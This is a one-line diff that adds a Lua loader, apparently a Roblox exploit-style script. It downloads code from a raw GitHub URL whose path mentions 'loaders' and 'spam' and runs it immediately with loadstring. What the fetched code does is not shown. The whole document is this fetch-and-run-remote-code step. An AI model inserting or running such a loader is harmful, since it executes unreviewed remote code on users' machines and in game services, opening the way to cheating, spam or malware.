@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/cure-violence-district-spam4-5rac2wmlj07c1y.lua"))()
